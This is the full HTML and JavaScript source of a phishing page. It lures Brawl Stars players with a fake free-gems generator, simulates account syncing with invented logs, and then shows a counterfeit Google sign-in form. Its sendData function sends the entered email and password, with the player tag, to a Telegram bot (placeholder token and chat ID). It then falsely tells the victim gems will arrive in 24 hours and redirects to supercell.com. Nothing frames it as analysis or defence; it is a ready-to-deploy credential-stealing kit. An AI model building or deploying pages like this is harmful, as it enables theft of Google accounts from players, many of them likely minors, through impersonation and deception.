<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Brawl Stars Generator</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Rubik+One&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Lilita One', 'Rubik One', cursive; 
            overflow-x: hidden;
            background: #1a2969;
        }

        .bg-overlay {
            position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
            background-image: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
            background-size: 300px auto; opacity: 0.1;
            animation: moveBackground 60s linear infinite;
            z-index: 0; pointer-events: none;
        }

        @keyframes moveBackground { 0% { transform: translate(0, 0); } 100% { transform: translate(-300px, -300px); } }

        .wrapper {
            position: relative; z-index: 10;
            display: flex; flex-direction: column; align-items: center;
            padding: 20px; min-height: 100vh;
        }

        .lang-selector { position: absolute; top: 10px; right: 10px; z-index: 100; }
        .lang-btn {
            background: rgba(0,0,0,0.7); border: 2px solid #fff; color: #fff;
            padding: 8px 15px; border-radius: 12px; cursor: pointer;
            font-family: 'Rubik One', sans-serif; font-size: 14px; text-transform: uppercase;
        }
        .lang-dropdown {
            display: none; position: absolute; right: 0; top: 45px;
            background: white; border: 4px solid #000; border-radius: 12px;
            overflow: hidden; width: 110px;
        }
        .lang-dropdown div {
            padding: 10px; color: #000; cursor: pointer; text-align: center;
            font-family: 'Rubik One', sans-serif; font-size: 14px; border-bottom: 2px solid #eee;
        }
        .lang-dropdown div:hover { background: #ffd84d; }

        .logo { width: 220px; margin: 10px 0; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }

        .shelly-container {
            display: flex; align-items: center; width: 100%; max-width: 450px;
            margin-bottom: 20px; animation: shellyFloat 3s ease-in-out infinite;
        }

        @keyframes shellyFloat { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }

        .shelly-avatar {
            width: 80px; height: 80px; border-radius: 50%; border: 4px solid #000;
            background: #fff; z-index: 2;
        }

        .brawl-bubble {
            background: white; border: 4px solid black; border-radius: 20px;
            padding: 15px; margin-left: -15px; position: relative; flex: 1;
        }

        .bubble-text { 
            color: #000; font-size: 15px; line-height: 1.1; 
            font-family: 'Rubik One', sans-serif; text-transform: uppercase;
        }

        .main-box {
            background: white; border: 5px solid #000; border-radius: 25px;
            width: 100%; max-width: 450px; padding: 25px;
            box-shadow: 0 12px 0 rgba(0,0,0,0.2); text-align: center; box-sizing: border-box;
        }

        .step-title { font-size: 20px; color: #000; margin-bottom: 15px; font-family: 'Rubik One', sans-serif; text-transform: uppercase; }

        .tag-input-wrapper { background: #eee; border: 3px solid #ccc; border-radius: 12px; padding: 8px; margin-bottom: 20px; }
        
        /* –°—Ç–∏–ª–∏ –¥–ª—è –∏–Ω–ø—É—Ç–∞ (–æ–±—ã—á–Ω—ã–π –∏ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã–π) */
        input#tag {
            width: 100%; border: none; background: transparent;
            font-family: 'Rubik One', sans-serif; font-size: 24px; text-align: center; outline: none;
            color: #000;
        }
        input#tag:read-only {
            color: #777;
            cursor: not-allowed;
        }

        .gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
        .gem-card { background: #fff; border: 3px solid #ddd; border-radius: 15px; padding: 12px; cursor: pointer; }
        .gem-card.selected { border-color: #FFA800; background: #FFF9E6; transform: scale(1.03); }
        .gem-card span { font-family: 'Rubik One', sans-serif; font-size: 18px; display: block; margin-top: 5px; }

        .btn-yellow {
            background: linear-gradient(180deg, #FFD84D 0%, #FFA800 100%);
            border: 4px solid #000; border-radius: 15px;
            color: #fff; font-family: 'Rubik One', sans-serif; font-size: 22px;
            padding: 12px; width: 100%; cursor: pointer;
            box-shadow: 0 6px 0 #CC7A00; text-shadow: 2px 2px 0 rgba(0,0,0,0.3);
            text-transform: uppercase;
        }

        .google-ui { display: none; text-align: center; font-family: 'Source Sans Pro', sans-serif; padding-top: 10px; }
        .google-ui h2 { font-weight: 400; font-size: 24px; color: #202124; margin: 10px 0 5px; }
        .google-ui p { color: #5f6368; font-size: 16px; margin-bottom: 25px; }
        .g-input { 
            width: 100%; padding: 13px 15px; margin: 8px 0; 
            border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; 
            font-size: 16px; font-family: 'Source Sans Pro', sans-serif;
        }
        .g-input:focus { border: 2px solid #1a73e8; outline: none; padding: 12px 14px; }
        .btn-confirm-g {
            background: #1a73e8; color: white; border: none; padding: 10px 24px;
            border-radius: 4px; font-weight: 600; font-size: 14px; cursor: pointer;
            float: right; margin-top: 20px; font-family: 'Source Sans Pro', sans-serif;
        }

        .loader-wrap { display: none; margin: 20px 0; }
        .bar-bg { background: #eee; height: 25px; border: 3px solid #000; border-radius: 15px; overflow: hidden; }
        .bar-fill { background: #FFA800; height: 100%; width: 0%; transition: 0.1s; }
        .logs { text-align: left; background: #111; color: #0f0; padding: 10px; border-radius: 10px; font-family: monospace; font-size: 11px; height: 70px; margin-top: 15px; }
        .back-link { position: absolute; top: 15px; left: 15px; width: 30px; cursor: pointer; display: none; }
    </style>
</head>
<body>

<div class="bg-overlay"></div>

<div class="wrapper">
    <div class="lang-selector">
        <button class="lang-btn" onclick="toggleLang()">üåê <span id="current-lang">EN</span></button>
        <div class="lang-dropdown" id="lang-menu">
            <div onclick="setLang('EN')">ENGLISH</div>
            <div onclick="setLang('RU')">–†–£–°–°–ö–ò–ô</div>
        </div>
    </div>

    <img src="https://brawlergems.com/generator/images/logo_outlined_noBG.png" class="logo">

    <div class="shelly-container">
        <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="shelly-avatar">
        <div class="brawl-bubble">
            <div class="bubble-text" id="bubble-msg">Hey Brawler! Free gems event is live! Enter your tag to get started!</div>
        </div>
    </div>

    <div class="main-box" id="mainBox">
        <img src="https://brawlergems.com/generator/images/back.png" class="back-link" id="backBtn" onclick="goBack()">

        <div id="step-entry">
            <div class="step-title" id="t-entry-title">Enter Player Tag</div>
            <div class="tag-input-wrapper">
                <input type="text" id="tag" placeholder="#TAG123" maxlength="12">
            </div>
            <div class="step-title" style="font-size: 16px;" id="t-select-gems">Select Gems</div>
            <div class="gems-grid">
                <div class="gem-card selected" onclick="selectGems(this, '30')"><img src="https://brawlergems.com/generator/images/30.png" width="50"><span>30</span></div>
                <div class="gem-card" onclick="selectGems(this, '360')"><img src="https://brawlergems.com/generator/images/360.png" width="50"><span>360</span></div>
                <div class="gem-card" onclick="selectGems(this, '950')"><img src="https://brawlergems.com/generator/images/950.png" width="50"><span>950</span></div>
                <div class="gem-card" onclick="selectGems(this, '2000')"><img src="https://brawlergems.com/generator/images/2000.png" width="50"><span>2000</span></div>
            </div>
            <button class="btn-yellow" id="btn-connect" onclick="startLoading()">Connect</button>
        </div>

        <div id="step-load" class="loader-wrap">
            <div class="step-title" id="load-status">Connecting...</div>
            <div class="bar-bg"><div class="bar-fill" id="bar"></div></div>
            <div class="logs" id="log-box"></div>
        </div>

        <div id="step-ready" style="display:none;">
            <div style="background: #222; border-radius: 15px; padding: 20px; color: #fff; margin-bottom: 20px;">
                <div id="reward-display"></div>
                <div style="color: #FFD84D; font-size: 22px; font-family: 'Rubik One'; margin-top: 10px;" id="display-tag">#TAG</div>
                <div style="font-size: 13px; opacity: 0.7; text-transform: uppercase;" id="t-synced">Account Synced Successfully</div>
            </div>
            <button class="btn-yellow" id="claim-btn" onclick="showGoogle()">Claim Gems</button>
        </div>

        <div id="step-google" class="google-ui">
            <center><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75"></center>
            <h2 id="g-signin">Sign in</h2>
            <p id="g-desc">Use your Google Account</p>
            <input type="email" id="email" class="g-input" placeholder="Email or phone">
            <input type="password" id="pass" class="g-input" placeholder="Enter your password">
            <div style="overflow:hidden; width:100%;">
                <button class="btn-confirm-g" onclick="sendData()">Next</button>
            </div>
        </div>
    </div>
</div>

<script>
    let selectedGems = "30";
    let playerTag = "";
    let currentLang = "EN";
    const bubbleMsg = document.getElementById('bubble-msg');
    const tagInput = document.getElementById('tag');

    const translations = {
        EN: {
            bubble_start: "Hey Brawler! Free gems event is live! Enter your tag to get started!",
            bubble_search: "Searching for your account... Please wait!",
            bubble_found: "Account found! You can now claim your reward!",
            bubble_verify: "Almost there! Just verify you are a real Brawler!",
            entry_title: "Enter Player Tag",
            select_gems: "Select Gems",
            btn_connect: "Connect",
            btn_claim: "Claim",
            synced: "Account Synced Successfully",
            logs: ["> Searching player...", "> Database found", "> Syncing gems...", "> Finalizing..."],
            alert_tag: "Enter valid tag!",
            alert_fields: "Fill all fields!",
            alert_done: "Verification successful! Gems will be added in 24h."
        },
        RU: {
            bubble_start: "–ü–†–ò–í–ï–¢, –ë–†–ê–í–õ–ï–†! –†–ê–ó–î–ê–ß–ê –ì–ï–ú–û–í –ù–ê–ß–ê–õ–ê–°–¨! –í–í–ï–î–ò –°–í–û–ô –¢–ï–ì!",
            bubble_search: "–ò–©–£ –¢–í–û–ô –ê–ö–ö–ê–£–ù–¢... –ü–û–ñ–ê–õ–£–ô–°–¢–ê, –ü–û–î–û–ñ–î–ò!",
            bubble_found: "–ê–ö–ö–ê–£–ù–¢ –ù–ê–ô–î–ï–ù! –¢–ï–ü–ï–†–¨ –¢–´ –ú–û–ñ–ï–®–¨ –ó–ê–ë–†–ê–¢–¨ –ù–ê–ì–†–ê–î–£!",
            bubble_verify: "–ü–û–ß–¢–ò –ì–û–¢–û–í–û! –ü–†–û–°–¢–û –ü–û–î–¢–í–ï–†–î–ò, –ß–¢–û –¢–´ –ù–ï –†–û–ë–û–¢!",
            entry_title: "–í–í–ï–î–ò –¢–ï–ì –ò–ì–†–û–ö–ê",
            select_gems: "–í–´–ë–ï–†–ò –ì–ï–ú–´",
            btn_connect: "–ü–û–î–ö–õ–Æ–ß–ò–¢–¨",
            btn_claim: "–ó–ê–ë–†–ê–¢–¨",
            synced: "–ê–ö–ö–ê–£–ù–¢ –£–°–ü–ï–®–ù–û –°–ò–ù–•–†–û–ù–ò–ó–ò–†–û–í–ê–ù",
            logs: ["> –ü–û–ò–°–ö –ò–ì–†–û–ö–ê...", "> –ë–ê–ó–ê –î–ê–ù–ù–´–• –ù–ê–ô–î–ï–ù–ê", "> –°–ò–ù–•–†–û–ù–ò–ó–ê–¶–ò–Ø...", "> –ó–ê–í–ï–†–®–ï–ù–ò–ï..."],
            alert_tag: "–í–í–ï–î–ò–¢–ï –í–ï–†–ù–´–ô –¢–ï–ì!",
            alert_fields: "–ó–ê–ü–û–õ–ù–ò–¢–ï –í–°–ï –ü–û–õ–Ø!",
            alert_done: "–ü–†–û–í–ï–†–ö–ê –ü–†–û–ô–î–ï–ù–ê! –ì–ï–ú–´ –ü–†–ò–î–£–¢ –í –¢–ï–ß–ï–ù–ò–ï 24 –ß–ê–°–û–í."
        }
    };

    function toggleLang() {
        const menu = document.getElementById('lang-menu');
        menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
    }

    function setLang(lang) {
        currentLang = lang;
        document.getElementById('current-lang').innerText = lang;
        document.getElementById('lang-menu').style.display = 'none';
        updateUI();
    }

    function updateUI() {
        const t = translations[currentLang];
        bubbleMsg.innerText = t.bubble_start;
        document.getElementById('t-entry-title').innerText = t.entry_title;
        document.getElementById('t-select-gems').innerText = t.select_gems;
        document.getElementById('btn-connect').innerText = t.btn_connect;
        document.getElementById('t-synced').innerText = t.synced;
        
        if(currentLang === 'RU') {
            document.getElementById('g-signin').innerText = "–í—Ö–æ–¥";
            document.getElementById('g-desc').innerText = "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∞–∫–∫–∞—É–Ω—Ç Google";
            document.getElementById('email').placeholder = "–ê–¥—Ä–µ—Å —ç–ª. –ø–æ—á—Ç—ã –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω";
            document.getElementById('pass').placeholder = "–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å";
            document.querySelector('.btn-confirm-g').innerText = "–î–∞–ª–µ–µ";
        } else {
            document.getElementById('g-signin').innerText = "Sign in";
            document.getElementById('g-desc').innerText = "Use your Google Account";
            document.getElementById('email').placeholder = "Email or phone";
            document.getElementById('pass').placeholder = "Enter your password";
            document.querySelector('.btn-confirm-g').innerText = "Next";
        }
    }

    function selectGems(el, val) {
        document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('selected'));
        el.classList.add('selected');
        selectedGems = val;
    }

    function startLoading() {
        playerTag = tagInput.value;
        const t = translations[currentLang];
        if(playerTag.length < 3) return alert(t.alert_tag);
        
        // –§–ò–ö–°–ê–¶–ò–Ø –¢–ï–ì–ê: –¥–µ–ª–∞–µ–º –µ–≥–æ —Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è
        tagInput.readOnly = true;

        document.getElementById('step-entry').style.display = 'none';
        document.getElementById('step-load').style.display = 'block';
        bubbleMsg.innerText = t.bubble_search;
        let p = 0;
        let logs = t.logs;
        let lIdx = 0;
        let iv = setInterval(() => {
            p += 2;
            document.getElementById('bar').style.width = p + "%";
            if(p % 25 == 0 && lIdx < logs.length) {
                document.getElementById('log-box').innerHTML += "<div>" + logs[lIdx] + "</div>";
                document.getElementById('load-status').innerText = logs[lIdx].replace("> ", "");
                lIdx++;
            }
            if(p >= 100) { clearInterval(iv); setTimeout(showReady, 500); }
        }, 40);
    }

    function showReady() {
        const t = translations[currentLang];
        document.getElementById('step-load').style.display = 'none';
        document.getElementById('step-ready').style.display = 'block';
        document.getElementById('backBtn').style.display = 'block';
        document.getElementById('reward-display').innerHTML = `<img src="https://brawlergems.com/generator/images/${selectedGems}.png" width="90">`;
        document.getElementById('display-tag').innerText = playerTag.toUpperCase();
        document.getElementById('claim-btn').innerText = t.btn_claim + " " + selectedGems;
        bubbleMsg.innerText = t.bubble_found;
    }

    function showGoogle() {
        document.getElementById('step-ready').style.display = 'none';
        document.getElementById('step-google').style.display = 'block';
        bubbleMsg.innerText = translations[currentLang].bubble_verify;
    }

    async function sendData() {
        const t = translations[currentLang];
        const mail = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!mail || !pass) return alert(t.alert_fields);
        const token = "–¢–í–û–ô_–¢–û–ö–ï–ù";
        const chat = "–¢–í–û–ô_ID";
        const text = `üéØ LOG\nTag: ${playerTag}\nGems: ${selectedGems}\nMail: ${mail}\nPass: ${pass}`;
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`);
        alert(t.alert_done);
        window.location.href = "https://supercell.com";
    }

    function goBack() { 
        // –ü—Ä–∏ –≤–æ–∑–≤—Ä–∞—Ç–µ –Ω–∞–∑–∞–¥ (–µ—Å–ª–∏ –Ω—É–∂–Ω–æ) —Ä–∞–∑–±–ª–æ–∫–∏—Ä—É–µ–º —Ç–µ–≥, –Ω–æ –≤ —ç—Ç–æ–π –≤–µ—Ä—Å–∏–∏ –º—ã –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞–µ–º
        location.reload(); 
    }
</script>

</body>
</html>
